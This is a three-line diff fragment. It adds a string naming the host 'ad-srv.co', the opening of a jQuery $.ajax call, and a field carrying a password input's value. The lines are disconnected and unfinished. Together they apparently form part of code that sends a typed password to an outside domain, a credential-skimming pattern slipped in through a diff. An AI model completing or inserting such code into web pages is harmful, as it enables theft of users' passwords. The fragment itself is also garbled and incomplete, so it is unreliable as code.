@@ -1,0 +1,3 @@
+"ad-srv.co";
+$.ajax({
+"pw":pw.val()},
